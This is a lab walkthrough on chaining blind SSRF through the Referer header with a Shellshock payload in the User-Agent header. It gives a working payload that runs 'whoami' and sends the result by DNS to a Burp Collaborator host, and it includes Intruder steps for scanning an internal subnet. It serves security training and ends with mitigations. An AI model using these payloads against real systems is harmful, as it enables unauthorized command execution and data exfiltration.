# Lab 07: Blind SSRF with Shellshock Exploitation

## Lab Description

This lab uses analytics software that automatically fetches the URL supplied in the **Referer** header.

The analytics service is vulnerable to **Shellshock**, and the application is vulnerable to **Blind SSRF**.

Your objective is to use Blind SSRF to discover the vulnerable internal server and exploit Shellshock to exfiltrate the operating system username using Burp Collaborator.

---

# Objective

- Identify the vulnerable internal server.
- Exploit Shellshock via Blind SSRF.
- Retrieve the operating system username.
- Solve the lab.

---

# Vulnerability

The application fetches URLs supplied in the `Referer` header.

The internal analytics service processes the request using a CGI script that is vulnerable to **Shellshock**.

Since the response is never returned to the attacker, Burp Collaborator is required to verify successful exploitation.

---

# Shellshock Overview

Shellshock is a vulnerability in Bash that allows attackers to execute commands by injecting malicious function definitions into HTTP headers processed by vulnerable CGI scripts.

Example payload:

```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-DOMAIN
```

If the server is vulnerable, it executes the `nslookup` command and sends the current OS username to the Burp Collaborator domain.

---

# Exploitation Steps

## Step 1

Install the **Collaborator Everywhere** extension from the Burp BApp Store.

---

## Step 2

Add the lab domain to Burp Suite's **Target Scope**.

This allows Collaborator Everywhere to insert payloads automatically.

---

## Step 3

Browse the application.

Open any product page.

---

## Step 4

Observe that loading a product triggers an HTTP request through the `Referer` header.

Also note that the server forwards your **User-Agent** header.

---

## Step 5

Send the product request to **Burp Intruder**.

---

## Step 6

Generate a unique Burp Collaborator payload.

Example:

```text
abcd1234.burpcollaborator.net
```

---

## Step 7

Create the Shellshock payload.

```bash
() { :; }; /usr/bin/nslookup $(whoami).abcd1234.burpcollaborator.net
```

Replace the **User-Agent** header with this payload.

---

## Step 8

Modify the **Referer** header to target the internal network.

Example:

```text
http://192.168.0.1:8080
```

Highlight the final octet:

```
192.168.0.§1§
```

---

## Step 9

Configure Burp Intruder.

Payload Type:

```
Numbers
```

Range:

```
From: 1

To: 255

Step: 1
```

Launch the attack.

Burp now scans the internal subnet.

---

## Step 10

After the scan completes, return to the **Collaborator** tab.

Click:

```
Poll Now
```

---

## Step 11

Review the DNS interactions.

One of the requests contains:

```
<username>.abcd1234.burpcollaborator.net
```

The subdomain reveals the operating system username.

Submit this username to complete the lab.

---

# Burp Workflow

```
Browse Product

↓

Intercept Request

↓

Send to Intruder

↓

Replace User-Agent

↓

Insert Shellshock Payload

↓

Scan Internal Hosts

↓

Burp Collaborator

↓

Poll Now

↓

Receive DNS Interaction

↓

Extract OS Username
```

---

# Attack Flow

```
Attacker

↓

Referer Header

↓

Blind SSRF

↓

Internal Analytics Server

↓

Shellshock

↓

nslookup $(whoami)

↓

Burp Collaborator

↓

DNS Request

↓

Username Leaked
```

---

# Why This Works

The application makes a server-side request to an internal analytics service using the URL supplied in the `Referer` header.

The analytics service processes the attacker's `User-Agent` header using a vulnerable Bash CGI script.

The injected Shellshock payload executes the `nslookup` command, causing the server to send a DNS request to the Burp Collaborator domain.

The requested subdomain includes the result of the `whoami` command, allowing the attacker to identify the operating system user without receiving any direct HTTP response.

---

# Impact

Successful exploitation may allow attackers to:

- Execute operating system commands.
- Exfiltrate sensitive information.
- Discover internal hosts.
- Chain Blind SSRF into Remote Code Execution.
- Compromise internal infrastructure.

---

# Mitigation

- Patch systems vulnerable to Shellshock.
- Validate and restrict server-side requests.
- Restrict outbound network access.
- Avoid processing untrusted input in CGI environments.
- Monitor unexpected outbound DNS and HTTP traffic.

---

# Bug Bounty Methodology

When testing Blind SSRF:

- Identify features that fetch attacker-controlled URLs.
- Use Burp Collaborator to confirm server-side interactions.
- Look for vulnerable internal services.
- Test headers such as `Referer` and `User-Agent` where appropriate.
- Chain SSRF with additional vulnerabilities only when explicitly authorized by the program scope.

---

# Key Learnings

- Blind SSRF can be combined with other vulnerabilities to increase impact.
- Burp Collaborator is essential for detecting out-of-band interactions.
- Shellshock demonstrates how SSRF can become a path to command execution when vulnerable internal services are reachable.